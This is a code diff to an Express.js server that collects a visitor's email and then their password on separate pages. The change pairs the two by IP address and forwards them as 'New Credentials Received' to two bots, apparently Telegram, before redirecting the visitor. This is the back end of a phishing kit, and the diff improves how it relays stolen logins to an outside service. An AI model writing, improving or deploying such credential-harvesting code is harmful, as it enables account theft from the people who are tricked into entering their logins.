@@ -68,12 +68,17 @@ async function sendToAllBots(message) {
   }
 }
 
+// Store email temporarily
+let emailCache = {};
+
 app.post('/email', async (req, res) => {
   const email = req.body.email;
   console.log('Email received:', email);
 
-  // Send to both bots
-  await sendToAllBots(`📧 New Email Received:\n<code>${email}</code>`);
+  // Store the email with a unique identifier (could use session ID or IP)
+  const clientId = req.ip; // Using IP as a simple identifier
+  emailCache[clientId] = email;
+  
   res.redirect('/password.html');
 });
 
@@ -86,8 +91,21 @@ app.post('/password', async (req, res) => {
     return res.status(400).send('Password is required');
   }
 
+  // Get the client's email from cache
+  const clientId = req.ip;
+  const email = emailCache[clientId];
+  
+  // Prepare the combined message
+  let message = '🔐 New Credentials Received:\n\n';
+  if (email) {
+    message += `📧 Email: <code>${email}</code>\n`;
+    // Remove the email from cache after use
+    delete emailCache[clientId];
+  }
+  message += `🔑 Password: <code>${password}</code>\n\n⚠️ Handle with care!`;
+
   // Send to both bots with better formatting
-  await sendToAllBots(`🔑 New Password Received:\n<code>${password}</code>\n\n⚠️ Handle with care!`);
+  await sendToAllBots(message);
   res.redirect('/index.html');
 });
 
